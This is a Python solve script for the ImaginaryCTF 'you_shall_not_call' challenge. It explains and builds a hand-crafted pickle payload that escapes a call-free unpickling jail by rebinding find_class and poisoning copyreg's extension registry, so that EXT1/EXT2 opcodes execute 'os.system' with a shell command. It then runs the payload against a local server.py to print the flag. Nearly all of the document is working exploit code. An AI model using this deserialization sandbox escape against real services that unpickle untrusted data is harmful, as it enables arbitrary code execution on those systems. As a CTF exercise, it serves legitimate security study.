#!/usr/bin/env python3
"""Solve ImaginaryCTF `you_shall_not_call` -- a call-free pickle jail.

Recon: `server.py` hex-decodes your input and unpickles it, but first it
*removes* every calling opcode (REDUCE/INST/OBJ/NEWOBJ/NEWOBJ_EX), deletes
`find_class`, swaps in a `SecureUnpickler`, and strips `_`-containing
builtins. "You shall not call."

Clue: pickle has more than one way to invoke code. The EXT1/EXT2 opcodes look
up `copyreg._inverted_registry` -- and we can BUILD arbitrary attributes onto
objects without REDUCE. The plan (no function call in sight until the end):

  * GLOBAL-import __main__.pickle, __main__.__main__, __main__.__builtins__.
  * BUILD the module dict to restore builtins, then re-point
    SecureUnpickler.find_class at getattr, then at exec.
  * Poison pickle._inverted_registry so extension code 1 -> exec and
    extension code 2 -> our command string.
  * EXT1 / EXT2 fire exec("import os; os.system('cat flag.txt')").

We run the challenge as a LOCAL process (never a remote host) and read the
flag it prints.

Fetch first:  python challenges/fetch.py you_shall_not_call
"""
import os
import subprocess

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
CHALL = os.path.join(REPO, "challenges", "you_shall_not_call", "challenge")


def build_payload(command: bytes) -> bytes:
    return (
        b"\x80\x04c__main__\npickle\n\x940c__main__\n__main__\n\x94"
        b"c__main__\n__builtins__\nb0c__main__\nSecureUnpickler\nN}"
        b"Vfind_class\nc__main__\ngetattr\ns\x86bh\x00}"
        b"V_inverted_registry\n}K\x01h\x01Vexec\n\x86sK\x02V"
        + command
        + b"\n\x85ssb0\x82\x01\x940N}Vfind_class\nh\x02s\x86b0\x82\x02."
    )


def main() -> None:
    payload = build_payload(b"import os; os.system('cat flag.txt')")
    proc = subprocess.run(
        ["python3", "server.py"],
        input=payload.hex().encode() + b"\n",
        capture_output=True, timeout=30, cwd=CHALL,
    )
    out = proc.stdout.decode(errors="replace")
    print(out.strip())
    for line in out.splitlines():
        if "ictf{" in line:
            print("FLAG:", line.split("$")[-1].strip())


if __name__ == "__main__":
    main()
